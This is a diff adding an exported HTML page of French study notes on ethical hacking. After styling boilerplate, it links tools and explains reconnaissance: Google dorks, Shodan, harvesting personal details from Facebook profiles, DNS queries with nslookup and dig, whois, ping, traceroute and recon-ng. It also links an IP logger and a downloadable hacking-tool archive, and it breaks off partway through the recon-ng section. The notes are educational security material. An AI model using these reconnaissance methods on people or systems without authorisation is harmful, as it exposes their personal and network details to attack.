@@ -1,0 +1,753 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Les base éthiques</title><style>
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	text-indent: -1.7em;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Consolas, "Liberation Mono", Menlo, Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, YuMincho, "Yu Mincho", "Hiragino Mincho ProN", "Hiragino Mincho Pro", "Songti TC", "Songti SC", "SimSun", "Nanum Myeongjo", NanumMyeongjo, Batang, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC', 'Noto Sans CJK KR'; }
+
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Consolas, "Liberation Mono", Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC', 'Noto Sans Mono CJK KR'; }
+
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, YuMincho, "Yu Mincho", "Hiragino Mincho ProN", "Hiragino Mincho Pro", "Songti TC", "Songti SC", "SimSun", "Nanum Myeongjo", NanumMyeongjo, Batang, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC', 'Noto Sans CJK KR'; }
+
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC', 'Noto Sans Mono CJK KR'; }
+
+.highlight-default {
+}
+.highlight-gray {
+	color: rgb(155,154,151);
+}
+.highlight-brown {
+	color: rgb(100,71,58);
+}
+.highlight-orange {
+	color: rgb(217,115,13);
+}
+.highlight-yellow {
+	color: rgb(223,171,1);
+}
+.highlight-teal {
+	color: rgb(15,123,108);
+}
+.highlight-blue {
+	color: rgb(11,110,153);
+}
+.highlight-purple {
+	color: rgb(105,64,165);
+}
+.highlight-pink {
+	color: rgb(173,26,114);
+}
+.highlight-red {
+	color: rgb(224,62,62);
+}
+.highlight-gray_background {
+	background: rgb(235,236,237);
+}
+.highlight-brown_background {
+	background: rgb(233,229,227);
+}
+.highlight-orange_background {
+	background: rgb(250,235,221);
+}
+.highlight-yellow_background {
+	background: rgb(251,243,219);
+}
+.highlight-teal_background {
+	background: rgb(221,237,234);
+}
+.highlight-blue_background {
+	background: rgb(221,235,241);
+}
+.highlight-purple_background {
+	background: rgb(234,228,242);
+}
+.highlight-pink_background {
+	background: rgb(244,223,235);
+}
+.highlight-red_background {
+	background: rgb(251,228,228);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(55, 53, 47, 0.6);
+	fill: rgba(55, 53, 47, 0.6);
+}
+.block-color-brown {
+	color: rgb(100,71,58);
+	fill: rgb(100,71,58);
+}
+.block-color-orange {
+	color: rgb(217,115,13);
+	fill: rgb(217,115,13);
+}
+.block-color-yellow {
+	color: rgb(223,171,1);
+	fill: rgb(223,171,1);
+}
+.block-color-teal {
+	color: rgb(15,123,108);
+	fill: rgb(15,123,108);
+}
+.block-color-blue {
+	color: rgb(11,110,153);
+	fill: rgb(11,110,153);
+}
+.block-color-purple {
+	color: rgb(105,64,165);
+	fill: rgb(105,64,165);
+}
+.block-color-pink {
+	color: rgb(173,26,114);
+	fill: rgb(173,26,114);
+}
+.block-color-red {
+	color: rgb(224,62,62);
+	fill: rgb(224,62,62);
+}
+.block-color-gray_background {
+	background: rgb(235,236,237);
+}
+.block-color-brown_background {
+	background: rgb(233,229,227);
+}
+.block-color-orange_background {
+	background: rgb(250,235,221);
+}
+.block-color-yellow_background {
+	background: rgb(251,243,219);
+}
+.block-color-teal_background {
+	background: rgb(221,237,234);
+}
+.block-color-blue_background {
+	background: rgb(221,235,241);
+}
+.block-color-purple_background {
+	background: rgb(234,228,242);
+}
+.block-color-pink_background {
+	background: rgb(244,223,235);
+}
+.block-color-red_background {
+	background: rgb(251,228,228);
+}
+.select-value-color-default { background-color: rgba(206,205,202,0.5); }
+.select-value-color-gray { background-color: rgba(155,154,151, 0.4); }
+.select-value-color-brown { background-color: rgba(140,46,0,0.2); }
+.select-value-color-orange { background-color: rgba(245,93,0,0.2); }
+.select-value-color-yellow { background-color: rgba(233,168,0,0.2); }
+.select-value-color-green { background-color: rgba(0,135,107,0.2); }
+.select-value-color-blue { background-color: rgba(0,120,223,0.2); }
+.select-value-color-purple { background-color: rgba(103,36,222,0.2); }
+.select-value-color-pink { background-color: rgba(221,0,129,0.2); }
+.select-value-color-red { background-color: rgba(255,0,26,0.2); }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="e7c8fe21-c6be-4a7a-aa79-bef001f906d6" class="page sans"><header><img class="page-cover-image" src="https://images.unsplash.com/photo-1586325194227-7625ed95172b?ixlib=rb-1.2.1&amp;q=85&amp;fm=jpg&amp;crop=entropy&amp;cs=srgb&amp;ixid=eyJhcHBfaWQiOjYzOTIxfQ" style="object-position:center 21.689999999999998%"/><div class="page-header-icon page-header-icon-with-cover"><span class="icon">🧪</span></div><h1 class="page-title">Les base éthiques</h1></header><div class="page-body"><blockquote id="12cbb951-0e33-42dd-89ca-2d6fcf8fb7c3" class="">Liens Utiles:</blockquote><p id="92b4d297-82fa-4c5b-a5c2-497511a04cd7" class="">Liste de bug bounty: <a href="https://yeswehack.com/programs">https://yeswehack.com/programs</a></p><p id="caa35022-57da-4950-8eb9-84f0f8282421" class="">IP logger: <a href="https://webresolver.nl/tools/iplogger">https://webresolver.nl/tools/iplogger</a></p><p id="4534edb5-7938-488a-ba3c-3c49d9bbf6a8" class="">Machine virtuelle de test d&#x27;intrusion <a href="https://la-vache-libre.org/metasploitable-2-guide-dexploitation-apprendre-a-utiliser-metasploit/">https://la-vache-libre.org/metasploitable-2-guide-dexploitation-apprendre-a-utiliser-metasploit/</a></p><p id="a69fa714-b644-49c7-80f8-7456966954f4" class="">LinuxChoice Tools:<a href="http://www.mediafire.com/file/kbqpcr27yd1xfn4/TheLinuxChoice-Archives.zip/file">http://www.mediafire.com/file/kbqpcr27yd1xfn4/TheLinuxChoice-Archives.zip/file</a></p><p id="2e47fc2f-ac70-482a-a8d7-1d0e32bc84c0" class=""><a href="https://www.shodan.io/explore">https://www.shodan.io/explore</a></p><p id="a5937741-903d-4fa9-8d47-65d71696791b" class="">Liste CVE: <a href="https://nvd.nist.gov/vuln/search">https://nvd.nist.gov/vuln/search</a></p><p id="56bf0ccb-3572-4fb4-a3e1-257fbd7346cd" class="">Site d&#x27;entrainement au hacking: tryhackme</p><p id="d299ceaa-ab6e-4352-9569-af6cb7d17d97" class="">
+</p><p id="a09611ab-f8c5-4a9c-9b73-bc91e81c952a" class="">
+</p><p id="204ec45f-4acb-4124-9557-0762f929157c" class=""><em><strong>Sources:</strong></em><em> Hacking Éthique : Le Cours Complet, Hacking-easy-hacking-for-beginners-2016, Initiating-to-ethical-hacking-with-kali-linux-2015</em></p><p id="6f5eb962-7789-4231-b929-dabfef8a0509" class="">
+</p><h2 id="23501b0d-4900-40f1-b115-df46a1163027" class="">La reconnaissance 🔎</h2><figure class="block-color-gray_background callout" style="white-space:pre-wrap;display:flex" id="2b5feee6-d215-47f3-a6fb-b060f8156e05"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%">Elle consiste à en apprendre un maximum sur la cible. Elle peut être passive (recherches simple sur google, whois etc) ou active (Intrusion physique, social engineering etc)</div></figure><p id="361c66a6-cfaf-4c73-a85d-9d60104523a1" class="">
+</p><h3 id="56d26d62-350f-46a5-8af7-4e936fa50665" class=""><strong>La reconnaissance par recherche internet </strong></h3><ul id="1b2c20c7-fa47-400f-aefa-e033eeb200b6" class="bulleted-list"><li><strong>Le google hacking</strong></li></ul><figure class="block-color-gray_background callout" style="white-space:pre-wrap;display:flex" id="37d32e42-84d2-42ce-95a1-906f5708d7a0"><div style="font-size:1.5em"><span class="icon">📖</span></div><div style="width:100%">Utilisation de l&#x27;indexation google avec des opérateurs de recherche spécifiques (filetype, inurl etc).</div></figure><p id="27c4d9b2-de5c-4d1d-a5a6-548daeae0885" class=""><strong><em>Les Dorks</em></strong></p><p id="3fc70db7-0497-423b-a8c0-8c3e62c932d6" class="">Le google hacking est souvent décris par l&#x27;utilisation d&#x27;outils appelés des &quot;Dorks&quot;</p><p id="10c1a18b-7b30-45d3-8738-3f579ddfaf80" class="">On parle de &quot;dorks&quot; google des opérateurs de recherche permettant de trouver des sites potentiellement vulnérables. Leurs utilisation est simple: il suffit de les taper dans google. Ces dorks sont listés par catégorie sur le site:</p><p id="03c42b8d-7e45-4962-a1b7-bc5e7979fb3e" class=""><a href="https://www.exploit-db.com/google-hacking-database">https://www.exploit-db.com/google-hacking-database</a></p><p id="8b5fc6fd-703e-4913-9aa2-6145d7e42eaa" class=""><em><strong>Les opérateurs de recherches avancée</strong></em></p><p id="cf980653-c141-4ece-bf6a-b0a391dd757c" class="">La reconnaissance se fait aussi grâce à des outils accessibles. En effet, google met à disposition un système de recherche avancée. Par exemple, l&#x27;opérateur &quot;filetype:&quot; suivi d&#x27;une extension de fichier recherche des résultats ayant la même extension. Pour faciliter la tâche, google à mis en pl8ace une interface plus &quot;amicale&quot; de cet recherche avancée:</p><p id="e5bdafd4-d1d9-4ce9-8177-bb3e8916690c" class=""><a href="https://www.google.com/advanced_search?hl=fr">https://www.google.com/advanced_search?hl=fr</a></p><p id="5ff6eb7f-7a84-4fb0-9e0a-4d328e8c1540" class="">
+</p><ul id="55eba22d-c9e9-4ca3-b4b4-3fe85b79dedb" class="bulleted-list"><li><strong>La recherche Shodan</strong></li></ul><figure class="block-color-gray_background callout" style="white-space:pre-wrap;display:flex" id="00ccead7-775f-4bc6-ba01-69f5952d9ac6"><div style="font-size:1.5em"><span class="icon">📖</span></div><div style="width:100%">Shodan est un moteur de recherche créé en 2009 par John Matherly. Ce site référence le résultat de balayages de ports massifs effectués sur le réseau Internet.</div></figure><p id="e725cc37-7f5d-40eb-80b9-f2807dc9f666" class="">Shodan est une solution essentielle pour récupérer des info sur un service. Il liste l&#x27;ip, l&#x27;adresse les ports et bien d&#x27;autres choses potentiellement utiles par la suite. Le site est accessible à cet adresse:</p><p id="0b536fa4-8e84-4f48-84b4-4a97da4d593c" class="">et ses opérateurs de recherche spécifiques sont listés dans leurs github:</p><p id="ad26c8b7-62e1-408e-b8ff-7147606b097c" class=""><a href="https://www.shodan.io/">https://www.shodan.io/</a></p><p id="d4c71d49-0d5b-4b47-964c-0057cab7aa38" class=""><a href="https://github.com/JavierOlmedo/shodan-filters">https://github.com/JavierOlmedo/shodan-filters</a></p><p id="917766f3-ce5a-40e5-9a98-c0d730cadccb" class="">
+</p><ul id="b4a58824-c01c-44c4-93cb-14ed877ed7dd" class="bulleted-list"><li><strong>La recherche Facebook</strong></li></ul><p id="a89deaba-aee6-4a08-b0f9-3e5b83b0603d" class="">Souvent sous-estimé, le réseau social Facebook est connu comme celui ayant la plus grande base de donnés d&#x27;utilisateurs. Un profil peut donc publiquement afficher par défaut une numéro de téléphone, une adresse mail, un lieux de vie etc. Il n&#x27;est donc pas étonnant de se voir l&#x27;utiliser dans de nombreuses phases de reconnaissance.</p><p id="2aed980d-c29a-4407-9dbb-99252129bf43" class=""><a href="https://www.facebook.com/">https://www.facebook.com/</a></p><p id="09df5ed1-7681-495f-87de-9d655dcb7c89" class="">
+</p><h3 id="ce24d9e6-6496-43eb-b836-efcc3bb82d42" class=""><strong>La reconnaissance DNS </strong></h3><figure class="block-color-gray_background callout" style="white-space:pre-wrap;display:flex" id="30ee77e1-faec-42ed-82e3-c25d25692d2e"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%">DNS signifie Domain Name System. C&#x27;est un protocole permettant de convertir un nom d’hôte en adresse ip. Il utilise le port 53 (UDP) donc ne nécessite pas de connexion.</div></figure><p id="261fc1ae-45c5-4db6-bfc8-237b4bba98cb" class="">
+</p><p id="f6aee8b0-b389-40d4-8b9b-06edcd9767d9" class="">Il existe plusieurs type de champs DNS:</p><p id="d71b6e3a-e0c7-4249-b11d-cbaf2d9378e7" class="">-<strong>A</strong>  Nom d&#x27;hôte vers Ipv4</p><p id="4ad8fc94-1af3-4e42-806c-4e20458f0405" class="">-<strong>AAAA</strong> Nom d&#x27;hôte vers Ipv6</p><p id="b19a3610-e83a-4ca2-bd9b-7d1ddd3aee31" class="">-<strong>PTR </strong>Ip vers Nom d&#x27;hôte</p><p id="06eb1e20-783d-4f04-84ef-6e2879c351d6" class="">-<strong>MX </strong>Serveur mail</p><p id="cc1f5f78-3516-4467-b841-94e4b97162cb" class="">
+</p><ul id="a53d8df1-3a4f-4363-a2ab-34dd5907e216" class="bulleted-list"><li><strong>Récupération DNS avec Nslookup</strong></li></ul><p id="5c4eff93-bb9b-4e4b-9745-1f814aee9fd9" class="">Nslookup est un outils de récupération DNS très simple. Pour lancer un scan, il suffit de taper :</p><pre id="34152ed4-cdce-480a-abe2-b05cc475940a" class="code"><code>nslookup <a href="http://site.fr/">site.fr</a></code></pre><p id="98ddfba5-e902-4195-afee-d56ab71e41c4" class="">On peut aussi préciser quelle requête DNS envoyer:</p><pre id="6fed019c-8079-44cd-b3c0-54ca826282dd" class="code"><code>nslookup
+set type=&quot;type de dns&quot;
+<a href="http://site.fr/">site.fr</a></code></pre><p id="ae150308-e97a-45ce-8335-da7e75b0de73" class="">
+</p><ul id="d2133615-8a52-400e-969c-999a7b1b60b4" class="bulleted-list"><li><strong>Récupération DNS avec Dig </strong></li></ul><p id="96720aed-a791-4a99-b88a-d9b7ca4fcf5e" class="">Bien que l&#x27;outil précédent soit fonctionnel, il n&#x27;est malheureusement plus maintenu par les développeurs. Il est donc préférable d&#x27;utiliser dig qui n&#x27;es pas plus compliquer.</p><p id="f686712b-77ea-49d7-bf18-cb5fe2399321" class="">
+</p><p id="10a36e46-9d57-43c2-b6d1-5b97d162f619" class="">Taper simplement cette commande dans le terminal pour lancer un scan avec dig:</p><pre id="a28941c1-3036-417f-840a-80af2fb56b63" class="code"><code>dig <a href="http://site.fr/">site.fr</a></code></pre><p id="1d1115a0-2d97-4453-96af-5fa7f4982583" class="">Pour préciser le type de la requête:</p><pre id="e337a8b7-2f64-434b-94da-7c25025610d9" class="code"><code>dig <a href="http://site.fr/">site.fr</a> &quot;type&quot;</code></pre><p id="3e3d41d2-1c67-4e9a-8f00-01987a7c1a76" class="">
+</p><ul id="720d5982-079b-40ab-97eb-5f56fdd64cfd" class="bulleted-list"><li><strong>Récupération DNS en ligne</strong></li></ul><p id="d2a7e4a1-5edf-4d6d-a1a2-2f1a671bf755" class="">La dernière méthode est aussi simple que les 2 autre. Cet outils en ligne fait globalement la même chose et évite de taper des lignes de commandes. Je la trouve cependant moins éducative car elle  n&#x27;entraine pas à la familiarisation avec le terminal. Voici le lien:</p><p id="20d77055-9f58-40ba-af64-fbafe9320eec" class=""><a href="https://www.robtex.com/dns-lookup/">https://www.robtex.com/dns-lookup/</a></p><p id="2d7fddbc-b6b1-40be-9924-48a9edc64101" class="">
+</p><ul id="7c799744-06c2-4ceb-9f46-855094d634a0" class="bulleted-list"><li><strong>Les requêtes Whois</strong></li></ul><h3 id="e987ac62-cc60-45d9-b3eb-111b550e743c" class="">La reconnaissance d&#x27;informations publiques </h3><p id="1e7cecfa-f53b-44ef-8855-42b749905c68" class="">Whois est un système qui permet de récupérer des informations sur le propriétaire d&#x27;un nom de domaine. Ce service est publique et gratuit mais augmente les risque de spam et par conséquence les données whois sont de plus en plus protégées. Il existe plusieurs service whois. Voici le plus connus et fonctionnel:</p><p id="32837653-65a8-4f6e-9568-815d4a151288" class=""><a href="https://whois.domaintools.com/">https://whois.domaintools.com/</a></p><p id="5467684c-83d5-46f6-ae97-79f6d0074b27" class="">
+</p><ul id="9283d515-5bbe-4ba3-8605-60b2a0a49c51" class="bulleted-list"><li><strong>Traceroute et Ping</strong></li></ul><figure class="block-color-gray_background callout" style="white-space:pre-wrap;display:flex" id="290a60a7-c232-42f9-bcc0-d5bfcc197d9b"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%">Les commande traceroute et ping servent toutes les deux à tester la réponse d&#x27;un service.</div></figure><p id="484f36b3-e54c-416b-9ec5-0264e990ecf9" class="">
+</p><p id="6b547334-0f9f-41c5-b053-97c2027ba9e0" class=""><em><strong>Ping </strong></em></p><p id="1be4dcd8-0a6f-41e8-99af-3ed2af7612d5" class="">Ping envoie un paquet et calcule le temps de réponse en milliseconde:</p><pre id="1671b9c4-b4d0-4e67-b965-f9691d36b19a" class="code"><code>ping &quot;adresse ip ou <a href="http://site.fr/">site.fr</a>&quot;</code></pre><p id="ea3151c9-b5e5-4786-813a-14320d5cf2ec" class="">Il faut faire &quot;Ctrl+C&quot; pour arrêter le ping. On peut aussi préciser le nombre de ping (ici 3) avec -c</p><pre id="44ad0b06-2437-4c10-9e2d-b327530f784e" class="code"><code>ping &quot;adresse ip ou <a href="http://site.fr/">site.fr</a>&quot; -c3</code></pre><p id="26d7bc8e-9b49-4f0f-bc56-d1f68614bba9" class="">
+</p><p id="03f06893-c568-4cb3-99c6-076ad7d4828c" class=""><em><strong>Traceroute</strong></em></p><p id="c91ff110-b9fa-40b4-a767-7556bd1765af" class="">Traceroute affiche le chemin d&#x27;accès jusqu&#x27;au domaine en se servant de l&#x27;expiration des requête pour définir la localisation de chaque routeurs.</p><pre id="1d1c8735-da7e-49ef-8856-d6973137a7db" class="code"><code>traceroute &quot;adresse ip ou <a href="http://site.fr/">site.fr</a>&quot;</code></pre><p id="78b23c78-29c2-421a-913d-006b36fa056d" class="">
+</p><ul id="3def2dec-2d46-45e4-a5ed-41b7ef5cf5f8" class="bulleted-list"><li><strong>Outils en ligne</strong></li></ul><p id="144d21a0-09d6-422a-ba0e-b54e49ca2192" class=""><em><strong>IpLocation</strong></em></p><p id="29ff6be4-f420-47fc-bd36-2c9df607026d" class="">Cet outil sert à, comme son nom l&#x27;indique, afficher la localisation à partir d&#x27;une adresse ip ou d&#x27;un nom de domaine:
+<a href="https://www.iplocation.net/">https://www.iplocation.net/</a></p><p id="d3df9e3c-ebb3-4de1-8099-2566036ee3b5" class="">
+</p><p id="d95a736f-ae46-41f1-a1c5-b7b42a85eafc" class=""><em><strong>WebArchive</strong></em></p><p id="8b44f24e-c18b-4f13-9b26-96172e734c64" class="">Ce site permet de crée des &quot;snapshots&quot; de site. En gros, WebArchive va copier le code du site pour le sauvegarder dans leurs serveurs pour accéder à ses ancienne versions par la suite:</p><p id="3942ea81-45f1-418a-a28f-4557f770f9f9" class=""><a href="https://archive.org/">https://archive.org/</a></p><p id="7c5ce29e-58a0-4a81-9c27-fee6467eb405" class="">
+</p><ul id="6628568b-7313-4b6f-9b1e-b4e9748fde36" class="bulleted-list"><li><strong>Recon-ng</strong></li></ul><p id="224d9b22-731e-433b-b123-3222d5e46fc8" class="">Recon-ng est un outil complet pour la reconnaissance entre autre. Il se lance avec la commande :</p><pre id="d42a2566-1646-4bc3-8bb6-1533ffbb0f10" class="code"><code>sudo recon-ng</code></pre><p id="1834810e-e755-40e5-8fc3-3b953c52640e" class="">On peut afficher les différente commande ainsi que leurs rôle en tapant :</p><pre id="be4a5096-f1c6-4387-8bea-72cd3ec7fbf4" class="code"><code>help</code></pre><p id="0f3e589b-6c3d-4f95-92ee-3af93db8a7ed" class="">Pour installer les modules de recon-ng s&#x27;effectue grâce à la commande:</p><pre id="682bc04f-7e7a-4d12-b2b2-b5389528a235" class="code"><code>marketplace install all</code></pre><p id="ae66171f-5d8e-4df4-ac7b-537adf5a1340" class="">
+</p><figure class="block-color-gray_background callout" style="white-space:pre-wrap;display:flex" id="def3adb7-c09c-43b2-9b43-bbfb25f5d47f"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%">Des erreurs en rouge vont être afficher. Pas de panique, recon-ng nous préviens juste que certain modules nécessite des API. Nous pourront les ajouter par la suite.</div></figure><p id="39d29b94-8856-478d-a9b1-f06199afaba3" class="">
+</p><p id="d7103be5-c1cb-471b-81ab-84147cd9a4f8" class="">Pour lister les modules installer, on tape la commande:</p><pre id="ce38271d-d0b6-4008-8964-2f4d041e1053" class="code"><code>modules search</code></pre><p id="bbae7b56-aee0-4dd9-a7fe-9d697b6b0e52" class="">
+</p><p id="7a5c2016-08a9-4223-bd3a-3d52b8a47dc8" class="">Les modules sont classé par catégorie. Discovery, Exploitation, Reconaissance etc.</p><p id="2fe9f621-4cfe-44db-a65e-a8a3ad287958" class="">Pour charger un modules, taper:</p><pre id="9b6be42b-3c2c-40c6-8c8b-ab5eb4527021" class="code"><code>modules load &quot;modules&quot;</code></pre><p id="0b60840c-8ed6-4942-bb50-10ccba0ea612" class="">
